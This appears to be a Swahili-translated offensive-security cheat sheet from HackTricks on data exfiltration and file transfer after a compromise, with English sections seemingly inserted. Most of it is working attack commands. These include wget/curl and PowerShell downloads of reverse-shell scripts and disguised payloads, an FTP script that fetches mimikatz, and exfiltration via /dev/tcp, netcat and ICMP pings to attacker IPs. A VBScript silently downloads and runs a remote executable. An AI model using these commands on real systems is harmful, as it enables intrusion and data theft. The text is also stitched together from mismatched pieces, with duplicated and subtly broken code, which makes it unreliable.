# Uchukuzi

<details>

<summary><strong>Jifunze kuhusu uchomaji wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za uchomaji kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pata udhaifu unaofaa zaidi ili uweze kuzirekebisha haraka. Intruder inafuatilia eneo lako la shambulio, inafanya uchunguzi wa vitisho wa kujitokeza, inapata masuala katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Domain za kawaida zilizowekwa kwenye orodha nyeupe kwa ajili ya uchukuzi wa habari

Angalia [https://lots-project.com/](https://lots-project.com/) ili kupata domain za kawaida zilizowekwa kwenye orodha nyeupe ambazo zinaweza kutumiwa vibaya

## Nakili na Bandika Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Pakia faili

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer inayochapisha GET na POSTs (pamoja na vichwa)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Moduli ya Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Seva ya HTTPS**

Kwa kawaida, data inayotumwa kati ya kivinjari na seva inalindwa na itifaki ya HTTPS. Hii inamaanisha kuwa data inasimbwa na kuwa salama wakati wa uhamishaji. Hata hivyo, kuna njia kadhaa za kuvunja usalama huu na kuchukua data iliyotumwa kwenye seva ya HTTPS.

Moja ya njia hizo ni kuanzisha seva ya HTTPS bandia. Hii inahusisha kujenga seva ya HTTPS ambayo inafanana na seva halisi na ina cheti cha SSL kinachofanana. Kisha, unaweza kudanganya kivinjari kuamini kuwa seva yako bandia ni seva halisi. Kwa njia hii, unaweza kuchukua data iliyotumwa kwenye seva ya HTTPS bandia.

Njia nyingine ni kuvunja usimbaji wa data. Hii inaweza kufanyika kwa kutumia njia kama vile kuvunja cheti cha SSL, kudukua seva, au kudukua kivinjari. Mara tu data imevunjwa usimbaji wake, unaweza kuisoma na kuichukua.

Kwa ujumla, kuna njia nyingi za kuchukua data iliyotumwa kwenye seva ya HTTPS. Ni muhimu kwa wataalamu wa udukuzi kuelewa njia hizi ili kuboresha usalama wa mifumo ya mtandao.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Seva ya FTP (python)

```python
import socket
import os

def send_file(file_path, host, port):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the FTP server
    s.connect((host, port))

    # Open the file in binary mode
    with open(file_path, 'rb') as file:
        # Read the file in chunks
        chunk = file.read(1024)

        # Send the file data to the server
        while chunk:
            s.send(chunk)
            chunk = file.read(1024)

    # Close the socket connection
    s.close()

def receive_file(file_path, host, port):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the FTP server
    s.connect((host, port))

    # Create a file to write the received data
    with open(file_path, 'wb') as file:
        # Receive the file data from the server
        chunk = s.recv(1024)

        # Write the received data to the file
        while chunk:
            file.write(chunk)
            chunk = s.recv(1024)

    # Close the socket connection
    s.close()
```

### Kutuma faili

```python
send_file('/path/to/file', 'ftp.example.com', 21)
```

### Kupokea faili

```python
receive_file('/path/to/file', 'ftp.example.com', 21)
```
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### Seva ya FTP (NodeJS)

#### Mbinu ya Kuvuja

Kuvuja ni mchakato wa kuhamisha data kutoka kwenye mfumo wa lengo kwenda kwenye seva ya mshambuliaji. Kuna njia mbalimbali za kufanya hivyo kwenye seva ya FTP iliyoundwa kwa kutumia NodeJS. Hapa chini ni mifano ya mbinu kadhaa za kuvuja data kutoka kwenye seva ya FTP:

#### 1. Kuvuja kwa kutumia FTP put

Mbinu hii inahusisha kutumia amri ya FTP put ili kuhamisha faili kutoka kwenye mfumo wa lengo kwenda kwenye seva ya mshambuliaji. Kwa kufanya hivyo, unaweza kutumia programu ya FTP kama vile FileZilla au kutumia script ya NodeJS iliyoandikwa kwa kusudi hili. Hapa chini ni mfano wa script ya NodeJS inayotumia moduli ya `ftp`:

```javascript
const ftp = require('ftp');
const fs = require('fs');

const client = new ftp();

client.on('ready', () => {
  client.put('path/to/source/file', 'path/to/destination/file', (err) => {
    if (err) throw err;
    client.end();
  });
});

client.connect({
  host: 'ftp.server.com',
  user: 'username',
  password: 'password'
});
```

#### 2. Kuvuja kwa kutumia FTP get

Mbinu hii inahusisha kutumia amri ya FTP get ili kupakua faili kutoka kwenye mfumo wa lengo kwenda kwenye seva ya mshambuliaji. Unaweza kutumia programu ya FTP kama vile FileZilla au kutumia script ya NodeJS iliyoandikwa kwa kusudi hili. Hapa chini ni mfano wa script ya NodeJS inayotumia moduli ya `ftp`:

```javascript
const ftp = require('ftp');
const fs = require('fs');

const client = new ftp();

client.on('ready', () => {
  client.get('path/to/source/file', (err, stream) => {
    if (err) throw err;
    stream.pipe(fs.createWriteStream('path/to/destination/file'));
    client.end();
  });
});

client.connect({
  host: 'ftp.server.com',
  user: 'username',
  password: 'password'
});
```

#### 3. Kuvuja kwa kutumia FTP mzunguko wa data

Mbinu hii inahusisha kuanzisha mzunguko wa data kati ya mfumo wa lengo na seva ya mshambuliaji. Unaweza kutumia programu ya FTP kama vile FileZilla au kutumia script ya NodeJS iliyoandikwa kwa kusudi hili. Hapa chini ni mfano wa script ya NodeJS inayotumia moduli ya `ftp`:

```javascript
const ftp = require('ftp');
const fs = require('fs');

const client = new ftp();

client.on('ready', () => {
  client.list('path/to/source/directory', (err, list) => {
    if (err) throw err;
    list.forEach((file) => {
      const stream = fs.createReadStream(`path/to/source/directory/${file.name}`);
      client.put(stream, `path/to/destination/directory/${file.name}`, (err) => {
        if (err) throw err;
      });
    });
    client.end();
  });
});

client.connect({
  host: 'ftp.server.com',
  user: 'username',
  password: 'password'
});
```

#### 4. Kuvuja kwa kutumia FTP mzunguko wa data na compression

Mbinu hii inahusisha kuanzisha mzunguko wa data kati ya mfumo wa lengo na seva ya mshambuliaji na kisha kuzipunguza faili kabla ya kuzihamisha. Unaweza kutumia programu ya FTP kama vile FileZilla au kutumia script ya NodeJS iliyoandikwa kwa kusudi hili. Hapa chini ni mfano wa script ya NodeJS inayotumia moduli ya `ftp` na `zlib`:

```javascript
const ftp = require('ftp');
const fs = require('fs');
const zlib = require('zlib');

const client = new ftp();

client.on('ready', () => {
  client.list('path/to/source/directory', (err, list) => {
    if (err) throw err;
    list.forEach((file) => {
      const readStream = fs.createReadStream(`path/to/source/directory/${file.name}`);
      const compressStream = zlib.createGzip();
      const writeStream = client.put(`path/to/destination/directory/${file.name}.gz`);
      readStream.pipe(compressStream).pipe(writeStream);
    });
    client.end();
  });
});

client.connect({
  host: 'ftp.server.com',
  user: 'username',
  password: 'password'
});
```

#### 5. Kuvuja kwa kutumia FTP mzunguko wa data na encryption

Mbinu hii inahusisha kuanzisha mzunguko wa data kati ya mfumo wa lengo na seva ya mshambuliaji na kisha kuzisimbua faili kabla ya kuzihamisha. Unaweza kutumia programu ya FTP kama vile FileZilla au kutumia script ya NodeJS iliyoandikwa kwa kusudi hili. Hapa chini ni mfano wa script ya NodeJS inayotumia moduli ya `ftp` na `crypto`:

```javascript
const ftp = require('ftp');
const fs = require('fs');
const crypto = require('crypto');

const client = new ftp();

client.on('ready', () => {
  client.list('path/to/source/directory', (err, list) => {
    if (err) throw err;
    list.forEach((file) => {
      const readStream = fs.createReadStream(`path/to/source/directory/${file.name}`);
      const cipher = crypto.createCipher('aes-256-cbc', 'encryption-key');
      const writeStream = client.put(`path/to/destination/directory/${file.name}.enc`);
      readStream.pipe(cipher).pipe(writeStream);
    });
    client.end();
  });
});

client.connect({
  host: 'ftp.server.com',
  user: 'username',
  password: 'password'
});
```
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Seva ya FTP (pure-ftp)

#### Description

FTP (File Transfer Protocol) ni itifaki ya mtandao inayotumiwa kusambaza faili kati ya kompyuta. Pure-ftp ni seva ya FTP ambayo inatoa huduma ya kuhifadhi na kusambaza faili kwa watumiaji.

#### Exfiltration Techniques

1. **FTP Upload**: Unaweza kupakia faili kwenye seva ya FTP kwa kutumia amri ya `put` au `stor` kwenye mteja wa FTP. Hii inaruhusu wewe kuhamisha faili kutoka kwenye mfumo wa lengo kwenda kwenye seva ya FTP.

2. **FTP Download**: Unaweza kupakua faili kutoka kwenye seva ya FTP kwa kutumia amri ya `get` au `retr` kwenye mteja wa FTP. Hii inaruhusu wewe kuhamisha faili kutoka kwenye seva ya FTP kwenda kwenye mfumo wako.

3. **FTP Bounce Attack**: Hii ni mbinu ya kudanganya ambapo unatumia seva ya FTP kama mpatanishi kati ya mfumo wako na mfumo wa lengo. Unaweza kufanya hivyo kwa kuanzisha uhusiano wa FTP na seva ya FTP, kisha kutumia amri ya `port` au `pasv` ili kuhamisha faili kutoka kwenye mfumo wa lengo kwenda kwenye seva ya FTP.

#### Countermeasures

- Sanitize user input to prevent command injection attacks.
- Limit access to the FTP server to authorized users only.
- Use strong passwords and enforce regular password changes.
- Enable encryption (FTP over TLS/SSL) to secure data transmission.
- Regularly update and patch the FTP server software to fix any vulnerabilities.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Mteja wa Windows**

#### **Exfiltration Techniques**

##### **1. Data Compression**

Data compression involves reducing the size of the data to make it easier to transfer and exfiltrate. This can be done using various compression algorithms such as ZIP or RAR.

##### **2. Steganography**

Steganography is the practice of hiding data within other files or images. By embedding sensitive information within seemingly harmless files, it becomes difficult to detect and exfiltrate.

##### **3. DNS Tunneling**

DNS tunneling involves using DNS requests and responses to transfer data. By encoding the data within DNS queries or responses, it can be exfiltrated without raising suspicion.

##### **4. HTTP/S Traffic**

Exfiltrating data through HTTP/S traffic involves disguising the data as regular web traffic. This can be done by encrypting the data and sending it over HTTP/S protocols.

##### **5. Email**

Email can be used as a means of exfiltrating data by attaching sensitive information to the email and sending it to a predetermined recipient.

##### **6. Cloud Storage**

Cloud storage platforms can be used to exfiltrate data by uploading sensitive files to the cloud and then downloading them from a different location.

##### **7. USB Devices**

Physical USB devices can be used to exfiltrate data by copying sensitive files onto the device and then physically removing it from the target system.

##### **8. Printers**

Printers can be used to exfiltrate data by printing sensitive information onto paper and then physically removing it from the target location.

##### **9. Audio/Video**

Audio or video files can be used to exfiltrate data by embedding sensitive information within the file itself. This can be done using various techniques such as frequency modulation or LSB steganography.

##### **10. Covert Channels**

Covert channels involve using unconventional methods to exfiltrate data. This can include techniques such as using electromagnetic radiation or ultrasonic frequencies to transmit data.

#### **Prevention Measures**

To prevent data exfiltration, it is important to implement the following measures:

- Implement strong access controls and user authentication mechanisms.
- Regularly monitor network traffic for any suspicious activity.
- Use encryption to protect sensitive data.
- Implement intrusion detection and prevention systems.
- Educate employees about the risks of data exfiltration and the importance of following security protocols.

By implementing these prevention measures, organizations can significantly reduce the risk of data exfiltration and protect their sensitive information.
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Tafuta udhaifu unaofaa zaidi ili uweze kuzirekebisha haraka. Intruder inafuatilia eneo lako la shambulio, hufanya uchunguzi wa vitisho wa kujitolea, hupata matatizo katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali kama seva
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Au tumia samba kuunda sehemu ya smb share:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltration

## Introduction

Exfiltration is the process of unauthorized data transfer from a target system to an external location. In the context of hacking, exfiltration is a crucial step for attackers to steal sensitive information from a compromised system.

## Techniques

There are several techniques that attackers can use to exfiltrate data from a Windows system. Some common techniques include:

1. **File Transfer Protocol (FTP)**: Attackers can use FTP to transfer files from the compromised system to an external FTP server.

2. **Email**: Attackers can send sensitive data as email attachments to their own email accounts or to a remote email server.

3. **Web-based methods**: Attackers can use web-based methods such as uploading files to cloud storage services or using web forms to send data to external servers.

4. **Remote Desktop Protocol (RDP)**: Attackers can use RDP to remotely access the compromised system and transfer files to their own machines.

5. **DNS Tunneling**: Attackers can use DNS tunneling techniques to encode and transfer data through DNS requests.

6. **Covert Channels**: Attackers can use covert channels to hide data within legitimate network traffic, making it difficult to detect.

## Countermeasures

To prevent exfiltration attacks, it is important to implement the following countermeasures:

1. **Network Segmentation**: Implement network segmentation to isolate critical systems and restrict access to sensitive data.

2. **Data Loss Prevention (DLP)**: Deploy DLP solutions to monitor and prevent unauthorized data transfers.

3. **Firewalls and Intrusion Detection/Prevention Systems**: Use firewalls and IDS/IPS systems to monitor network traffic and detect suspicious activities.

4. **Encryption**: Encrypt sensitive data to protect it from unauthorized access during transit.

5. **User Awareness and Training**: Educate users about the risks of exfiltration attacks and train them to identify and report suspicious activities.

By implementing these countermeasures, organizations can significantly reduce the risk of data exfiltration and protect their sensitive information.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

Mshambuliaji lazima awe na SSHd inayofanya kazi.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Ikiwa mwathiriwa ana SSH, mshambuliaji anaweza kufunga saraka kutoka kwa mwathiriwa hadi kwa mshambuliaji.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC ni zana ya mtandao ambayo inaweza kutumika kwa mawasiliano ya mtandao ya msingi, kama vile kuanzisha uhusiano wa TCP, kusikiliza na kutuma data kupitia soketi. Inaweza kutumiwa kwa njia nyingi, ikiwa ni pamoja na kufanya uchunguzi wa mtandao, kuchunguza mifumo ya kompyuta, na hata kutekeleza shambulio la mtandao.

NC inaweza kutumika kwa exfiltration ya data, ambayo ni mchakato wa kuhamisha data kutoka kwenye mtandao uliolengwa kwenda kwa mtu wa tatu. Kwa kutumia NC, unaweza kuanzisha uhusiano wa TCP na seva ya kudhibiti uliyounda, na kisha kutuma data iliyochukuliwa kutoka kwa mtandao uliolengwa kwenda kwa seva hiyo ya kudhibiti.

Kwa mfano, unaweza kutumia NC kusikiliza trafiki ya mtandao inayopita kwenye mtandao uliolengwa na kisha kutuma data hiyo kwa seva yako ya kudhibiti. Hii inaweza kuwa njia ya kuvuja data kutoka kwa mtandao uliolengwa bila kugunduliwa.

NC pia inaweza kutumika kwa njia zingine za exfiltration ya data, kama vile kutuma faili kupitia soketi ya TCP. Unaweza kutumia NC kuanzisha uhusiano wa TCP na seva yako ya kudhibiti, kisha kutuma faili iliyochukuliwa kutoka kwa mtandao uliolengwa kwenda kwa seva hiyo ya kudhibiti.

NC ni zana yenye nguvu ambayo inaweza kutumiwa kwa njia nyingi za exfiltration ya data. Ni muhimu kwa wataalamu wa udukuzi na wataalamu wa usalama wa mtandao kuelewa jinsi ya kutumia NC kwa ufanisi na kwa usalama.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
To download a file from the victim's machine using the `/dev/tcp` method, you can use the following command:

```bash
cat <file> > /dev/tcp/<attacker_ip>/<attacker_port>
```

Replace `<file>` with the path and name of the file you want to download. Replace `<attacker_ip>` with your IP address and `<attacker_port>` with the port you want to use for the connection.

For example, to download a file named `important.txt` to your machine with the IP address `192.168.0.100` and using port `1234`, you would use the following command:

```bash
cat important.txt > /dev/tcp/192.168.0.100/1234
```

This command will send the contents of the file to the specified IP address and port, allowing you to download it on your machine.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Pakia faili kwa muathiriwa

To upload a file to the victim's system, you can use various methods depending on the access and vulnerabilities present. Here are a few techniques you can employ:

1. **Web-based file upload**: If the victim's system has a web application that allows file uploads, you can exploit this feature to upload a malicious file. Look for any input fields or forms that accept file uploads and try to bypass any restrictions or filters in place.

2. **Email attachments**: If you have access to the victim's email account, you can send an email with a malicious attachment. Craft the email in a way that entices the victim to open the attachment, which will then execute the desired actions on their system.

3. **Remote file inclusion**: If the victim's system is vulnerable to remote file inclusion (RFI), you can exploit this vulnerability to upload a file from a remote server. By manipulating the vulnerable parameter, you can specify the location of the file you want to upload.

4. **Exploiting software vulnerabilities**: If you discover a software vulnerability on the victim's system, you can exploit it to gain unauthorized access and upload files. This could involve exploiting a buffer overflow, SQL injection, or any other vulnerability that allows remote code execution.

Remember to always exercise caution and ensure that you have the necessary permissions and legal authorization before attempting any hacking activities.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
Asante kwa **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Ikiwa unaweza kutuma data kwa seva ya SMTP, unaweza kuunda SMTP ili kupokea data kwa kutumia python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Kwa chaguo-msingi katika XP na 2003 (katika wengine inahitaji kuongezwa wazi wakati wa usakinishaji)

Katika Kali, **anza seva ya TFTP**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Seva ya TFTP kwa kutumia Python:**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    while True:
        # Receive the request packet
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        # Check if it is a read request (RRQ)
        if opcode == 1:
            # Extract the filename from the request packet
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')

            # Open the file in binary mode
            try:
                file = open(filename, 'rb')
                block_number = 1
                block_data = file.read(512)

                while block_data:
                    # Create the data packet
                    data_packet = struct.pack('!HH', 3, block_number) + block_data

                    # Send the data packet to the client
                    server_socket.sendto(data_packet, client_address)

                    # Receive the ACK packet
                    ack_packet, client_address = server_socket.recvfrom(4)
                    ack_opcode = struct.unpack('!H', ack_packet[:2])[0]
                    ack_block_number = struct.unpack('!H', ack_packet[2:])[0]

                    # Check if the received ACK packet is valid
                    if ack_opcode != 4 or ack_block_number != block_number:
                        break

                    # Read the next block of data from the file
                    block_number += 1
                    block_data = file.read(512)

                # Close the file
                file.close()

            except FileNotFoundError:
                # Send an error packet to the client
                error_packet = struct.pack('!HH', 5, 1) + b'File not found'
                server_socket.sendto(error_packet, client_address)

        # Check if it is a write request (WRQ)
        elif opcode == 2:
            # Extract the filename from the request packet
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')

            # Open the file in binary mode
            try:
                file = open(filename, 'wb')
                block_number = 0

                while True:
                    # Create the ACK packet
                    ack_packet = struct.pack('!HH', 4, block_number)

                    # Send the ACK packet to the client
                    server_socket.sendto(ack_packet, client_address)

                    # Receive the data packet
                    data_packet, client_address = server_socket.recvfrom(516)
                    data_opcode = struct.unpack('!H', data_packet[:2])[0]
                    data_block_number = struct.unpack('!H', data_packet[2:4])[0]

                    # Check if the received data packet is valid
                    if data_opcode != 3 or data_block_number != block_number + 1:
                        break

                    # Write the data to the file
                    file.write(data_packet[4:])

                    # Increment the block number
                    block_number += 1

                    # Check if it is the last data packet
                    if len(data_packet) < 516:
                        break

                # Close the file
                file.close()

            except PermissionError:
                # Send an error packet to the client
                error_packet = struct.pack('!HH', 5, 2) + b'Access violation'
                server_socket.sendto(error_packet, client_address)

    # Close the server socket
    server_socket.close()

# Start the TFTP server
tftp_server()
```

Chanzo cha Python cha seva ya TFTP:

```python
import socket
import struct

def tftp_server():
    # Unda soketi ya UDP
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    while True:
        # Pokea pakiti ya ombi
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        # Angalia kama ni ombi la kusoma (RRQ)
        if opcode == 1:
            # Chukua jina la faili kutoka kwenye pakiti ya ombi
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')

            # Fungua faili kwa mode ya binary
            try:
                file = open(filename, 'rb')
                block_number = 1
                block_data = file.read(512)

                while block_data:
                    # Unda pakiti ya data
                    data_packet = struct.pack('!HH', 3, block_number) + block_data

                    # Tuma pakiti ya data kwa mteja
                    server_socket.sendto(data_packet, client_address)

                    # Pokea pakiti ya ACK
                    ack_packet, client_address = server_socket.recvfrom(4)
                    ack_opcode = struct.unpack('!H', ack_packet[:2])[0]
                    ack_block_number = struct.unpack('!H', ack_packet[2:])[0]

                    # Angalia kama pakiti ya ACK iliyopokelewa ni sahihi
                    if ack_opcode != 4 or ack_block_number != block_number:
                        break

                    # Soma kundi la data lifuatalo kutoka kwenye faili
                    block_number += 1
                    block_data = file.read(512)

                # Funga faili
                file.close()

            except FileNotFoundError:
                # Tuma pakiti ya kosa kwa mteja
                error_packet = struct.pack('!HH', 5, 1) + b'File not found'
                server_socket.sendto(error_packet, client_address)

        # Angalia kama ni ombi la kuandika (WRQ)
        elif opcode == 2:
            # Chukua jina la faili kutoka kwenye pakiti ya ombi
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')

            # Fungua faili kwa mode ya binary
            try:
                file = open(filename, 'wb')
                block_number = 0

                while True:
                    # Unda pakiti ya ACK
                    ack_packet = struct.pack('!HH', 4, block_number)

                    # Tuma pakiti ya ACK kwa mteja
                    server_socket.sendto(ack_packet, client_address)

                    # Pokea pakiti ya data
                    data_packet, client_address = server_socket.recvfrom(516)
                    data_opcode = struct.unpack('!H', data_packet[:2])[0]
                    data_block_number = struct.unpack('!H', data_packet[2:4])[0]

                    # Angalia kama pakiti ya data iliyopokelewa ni sahihi
                    if data_opcode != 3 or data_block_number != block_number + 1:
                        break

                    # Andika data kwenye faili
                    file.write(data_packet[4:])

                    # Ongeza idadi ya kundi
                    block_number += 1

                    # Angalia kama ni kundi la mwisho la data
                    if len(data_packet) < 516:
                        break

                # Funga faili
                file.close()

            except PermissionError:
                # Tuma pakiti ya kosa kwa mteja
                error_packet = struct.pack('!HH', 5, 2) + b'Access violation'
                server_socket.sendto(error_packet, client_address)

    # Funga soketi ya seva
    server_socket.close()

# Anza seva ya TFTP
tftp_server()
```
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
Katika **mwathiriwa**, unganisha kwenye seva ya Kali:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Pakua faili kwa kutumia PHP oneliner:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript ni lugha ya programu inayotumiwa sana kwa skripti za Windows. Inaweza kutumika kwa ufanisi katika mazingira ya udukuzi kwa sababu ya uwezo wake wa kufanya kazi na vitu vya mfumo wa Windows na kutekeleza hatua za udukuzi.

### Kusoma na Kuandika Faili

Kusoma na kuandika faili ni mchakato muhimu katika udukuzi. VBScript inatoa njia rahisi ya kufanya hivyo. Unaweza kutumia `FileSystemObject` ili kufungua faili, kusoma maudhui yake, na kuandika maudhui mapya.

```vbscript
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile("C:\path\to\file.txt", 1)
strContents = objFile.ReadAll
objFile.Close

Set objFile = objFSO.OpenTextFile("C:\path\to\file.txt", 2)
objFile.Write "Maudhui mapya"
objFile.Close
```

### Kupakua na Kutekeleza Faili

VBScript inaweza kutumika kupakua na kutekeleza faili kutoka kwa seva ya mbali. Hii inaweza kuwa njia ya kuingiza zisizo au kutekeleza hatua za udukuzi kwenye mfumo wa lengo.

```vbscript
strURL = "http://www.example.com/file.exe"
strFile = "C:\path\to\file.exe"

Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", strURL, False
objXMLHTTP.send

If objXMLHTTP.Status = 200 Then
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Open
    objADOStream.Type = 1
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    objADOStream.SaveToFile strFile
    objADOStream.Close
End If

Set objShell = CreateObject("WScript.Shell")
objShell.Run strFile, 0
```

